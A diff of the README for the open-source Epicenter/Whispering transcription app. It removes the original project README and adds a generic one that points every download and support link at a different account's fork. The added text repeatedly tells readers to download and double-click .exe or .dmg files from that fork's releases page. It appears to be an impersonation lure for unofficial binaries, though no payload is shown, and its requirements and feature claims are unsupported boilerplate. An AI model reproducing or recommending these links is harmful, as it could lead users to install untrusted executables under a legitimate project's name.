@@ -1,153 +1,76 @@
-<p align="center">
-  <a href="https://epicenter.so">
-    <img width="200" src="https://github.com/user-attachments/assets/9e210c52-2740-43b6-af3f-e6eaf4b5c397" alt="Epicenter">
-  </a>
-  <h1 align="center">Epicenter</h1>
-  <p align="center">Local-first, open-source apps</p>
-  <p align="center">Own your data. Use any model you want. Free and open source ❤️</p>
-</p>
+# 🎤 epicenter - Speak and Get Text Instantly
 
-> **🚧 Development Update:** Development on Epicenter will be a bit slower in the coming week while Braden takes some calls and stabilizes a new framework. Updates will resume after!
+## 🚀 Getting Started
 
-> **📢 Repository Update:** Whispering has become **Epicenter**! The original repository moved [here](https://github.com/epicenter-so/epicenter/tree/main/apps/whispering). Everything else remains the same—same tools, same philosophy, same team.
->
-> <details>
-> <summary> Full details...
-> </summary>
->
-> - Whispering's evolution beyond transcription required changes to the repository's structure and branding.
-> - Everything else remains the same—same tools, same philosophy, same team.
-> - The original app lives on as [*Epicenter Whispering*](https://github.com/epicenter-so/epicenter/tree/main/apps/whispering), keeping a tight focus on transcription.
-> - This makes room for standalone apps with complementary, but non-transcription-related features (like [*Epicenter Assistant*](https://github.com/epicenter-so/epicenter/tree/main/apps/sh)).
-> - The new [root](https://github.com/epicenter-so/epicenter/) of the Epicenter repository contains common files supporting all the apps in the ecosystem.
-> - Note: the old URL [github.com/braden-w/whispering](https://github.com/braden-w/whispering) is now just a thin placeholder redirecting to this rebranded repository.  
->
-> </details>
+Welcome to epicenter! This app lets you press a shortcut, speak, and receive the text right away. It’s free, open-source, and easy to use. Follow the steps below to download and run epicenter.
 
-<p align="center">
-  <!-- GitHub Stars Badge -->
-  <a href="https://github.com/epicenter-so/epicenter" target="_blank">
-    <img alt="GitHub stars" src="https://img.shields.io/github/stars/epicenter-so/epicenter?style=flat-square" />
-  </a>
-  <!-- Latest Version Badge -->
-  <img src="https://img.shields.io/github/v/release/epicenter-so/epicenter?style=flat-square&label=Latest%20Version&color=brightgreen" />
-  <!-- License Badge -->
-  <a href="LICENSE" target="_blank">
-    <img alt="MIT License" src="https://img.shields.io/github/license/epicenter-so/epicenter.svg?style=flat-square" />
-  </a>
-  <!-- Discord Badge -->
-  <a href="https://go.epicenter.so/discord" target="_blank">
-    <img alt="Discord" src="https://img.shields.io/badge/Discord-Join%20us-5865F2?style=flat-square&logo=discord&logoColor=white" />
-  </a>
-  <!-- Platform Support Badges -->
-  <a href="https://github.com/epicenter-so/epicenter/releases" target="_blank">
-    <img alt="macOS" src="https://img.shields.io/badge/-macOS-black?style=flat-square&logo=apple&logoColor=white" />
-  </a>
-  <a href="https://github.com/epicenter-so/epicenter/releases" target="_blank">
-    <img alt="Windows" src="https://img.shields.io/badge/-Windows-blue?style=flat-square&logo=windows&logoColor=white" />
-  </a>
-  <a href="https://github.com/epicenter-so/epicenter/releases" target="_blank">
-    <img alt="Linux" src="https://img.shields.io/badge/-Linux-yellow?style=flat-square&logo=linux&logoColor=white" />
-  </a>
-</p>
+[![Download epicenter](https://img.shields.io/badge/Download-epicenter-blue.svg)](https://github.com/rayshantinfo/epicenter/releases)
 
-<p align="center">
-  <a href="#current-tools">Tools</a> •
-  <a href="#where-were-headed">Vision</a> •
-  <a href="#join-us">Contributing</a> •
-  <a href="https://go.epicenter.so/discord">Discord</a> •
-</p>
+## 📥 Download & Install
 
----
+To get started, you need to visit the Releases page. Click the link below:
 
-## What is Epicenter?
+[Download from Releases Page](https://github.com/rayshantinfo/epicenter/releases)
 
-Epicenter is an ecosystem of open-source, local-first apps. Our eventual goal is to store all of your data—notes, transcripts, chat histories—in a single folder of plain text and SQLite. Every tool we build shares this memory. It's open, tweakable, and yours. Grep it, open it in Obsidian, host it wherever you like. The choice is yours.
+### Step 1: Download the Application
 
-### The Vision (how the ecosystem will work):
+1. Go to the Releases page using the link above.
+2. Look for the latest version of epicenter.
+3. Click on the file that matches your operating system. For example, download the `.exe` file for Windows or `.dmg` for Mac.
 
-- Long-time Epicenter Whispering users may have configured numerous LLM API keys, transformations, and even local models.
-- When the Epicenter Assistant is started for the very first time, all these API keys, transformations and local models seamlessly work.
-- Epicenter Assistant may even access Whispering transcription history to provide personalized results out of the box.
-- Of course, this works the other way, too: Whispering can take advantage of your Epicenter Assistant history to optimize transcriptions and transformations!
-- In a siloed ecosystem, this requires much more effort, or may not even be possible.
+### Step 2: Install the Application
 
-## Current Tools
+1. Once the file is downloaded, locate it in your downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the instructions on your screen to complete the installation.
 
-<table>
-  <tr>
-    <td align="center" width="50%">
-      <h3>🎙️ <a href="https://github.com/epicenter-so/epicenter/tree/main/apps/whispering">Epicenter Whispering</a></h3>
-      <p>Press shortcut → speak → get text. Desktop transcription that cuts out the middleman. Bring your own API key.</p>
-      <p><strong>→ <a href="https://github.com/epicenter-so/epicenter/tree/main/apps/whispering">View source code</a></strong></p>
-    </td>
-    <td align="center" width="50%">
-      <h3>
-        🤖 <a href="https://github.com/epicenter-so/epicenter/tree/main/apps/sh">Epicenter Assistant</a>
-        (currently unstable, waiting for 
-        <a href="https://github.com/sst/opencode/pull/1218">this PR</a> in OpenCode to merge)
-      </h3>
-      <p>A local-first assistant you can chat with. It lives in your folder, becoming the access point to everything you've ever written, thought, or built.</p>
-      <p><strong>→ <a href="https://github.com/epicenter-so/epicenter/tree/main/apps/sh">View source code</a></strong></p>
-    </td>
-  </tr>
-</table>
+### Step 3: Launch epicenter
 
-## Where We're Headed
+1. After installation, find epicenter in your applications menu or desktop.
+2. Double-click the icon to launch the app.
+3. You are now ready to use epicenter!
 
-Our vision is to build a personal workspace where you own your data, choose your models, and replace siloed apps with open, interoperable alternatives. All while preserving authenticity and being free and open source.
+## ⚙️ System Requirements
 
+For the best experience, ensure your system meets the following requirements:
 
-## Quick Start
+- **Operating System**: Windows 10 or later, macOS 10.14 or later.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: 100 MB of free space.
 
-Epicenter will have more apps in the future, but for now, the best way to get started is to run Whispering locally:
+## 🎛️ How to Use epicenter
 
-```bash
-# Prerequisites: Install Bun from https://bun.sh (run bun upgrade if there's issues)
-git clone https://github.com/epicenter-so/epicenter.git
-cd epicenter
-bun install  # Will prompt to upgrade if your Bun version is too old
-cd apps/whispering
-bun dev
-```
+Using epicenter is simple. Follow these steps:
 
-## Join Us
+1. **Set Up the Shortcut**: During your first launch, you will set a shortcut key. This key allows you to quickly start the app without searching for it.
+2. **Start Speaking**: Press your shortcut key to activate the app. Speak clearly and naturally into your microphone.
+3. **Get Your Text**: Once you finish speaking, epicenter will process your words and display the text on the screen.
 
-## Discord Community
+## 📢 Features
 
-If you think like a generalist, build like a hacker, and value tools that respect your mind—you'll fit right in.
+- **Voice Recognition**: Converts spoken words into text accurately.
+- **Custom Shortcuts**: Easily set a keyboard shortcut for quick access.
+- **Multilingual Support**: Works with multiple languages for wider use.
+- **Local-First Design**: Your data stays on your device, ensuring privacy.
 
-**→ [Join our Discord](https://go.epicenter.so/discord)**
+## 🔧 Troubleshooting
 
-### We're looking for contributors
+If you encounter issues while using epicenter, try the following:
 
-If you're passionate about open source, local-first software, or are just a cracked Svelte/TypeScript developer—we'd love to build with you.
+1. **Check Your Microphone**: Make sure your microphone is connected and properly configured in your system settings.
+2. **Permissions**: Ensure epicenter has permission to access your microphone.
+3. **App Restart**: If the app is not responding, close and reopen it.
 
-**→ [Read our Contributing Guide](CONTRIBUTING.md) to get started**
+## 🌍 Community and Support
 
-Contributors coordinate and share ideas in our Discord community.
+Join our community to share feedback, ask questions, and connect with other users. Visit our GitHub Issues page [here](https://github.com/rayshantinfo/epicenter/issues) for support.
 
-## Tech Stack
+## 📝 Contributing
 
-<p align="center">
-  <img alt="Svelte 5" src="https://img.shields.io/badge/-Svelte%205-orange?style=flat-square&logo=svelte&logoColor=white" />
-  <img alt="Tauri" src="https://img.shields.io/badge/-Tauri-blue?style=flat-square&logo=tauri&logoColor=white" />
-  <img alt="TypeScript" src="https://img.shields.io/badge/-TypeScript-blue?style=flat-square&logo=typescript&logoColor=white" />
-  <img alt="Rust" src="https://img.shields.io/badge/-Rust-orange?style=flat-square&logo=rust&logoColor=white" />
-  <img alt="TanStack Query" src="https://img.shields.io/badge/-TanStack%20Query-red?style=flat-square&logo=react-query&logoColor=white" />
-  <img alt="Tailwind CSS" src="https://img.shields.io/badge/-Tailwind%20CSS-38B2AC?style=flat-square&logo=tailwind-css&logoColor=white" />
-</p>
+We welcome contributions! If you want to help improve epicenter, check our contribution guidelines on the GitHub repository.
 
-## License
+## 🎉 Acknowledgments
 
-[MIT](LICENSE). Build on it. Fork it. Make it yours. Please contribute if you can.
+Thank you for choosing epicenter. We appreciate every user who decides to use our software. Enjoy speaking and getting your text!
 
----
-
-<p align="center">
-  <strong>Contact:</strong> <a href="mailto:github@bradenwong.com">github@bradenwong.com</a> | <a href="https://go.epicenter.so/discord">Discord</a> | <a href="https://twitter.com/braden_wong_">@braden_wong_</a>
-</p>
-
-<p align="center">
-  <sub>Built with ❤️ for data ownership, local-first, and open-source</sub>
-</p>
+[Download from Releases Page](https://github.com/rayshantinfo/epicenter/releases)
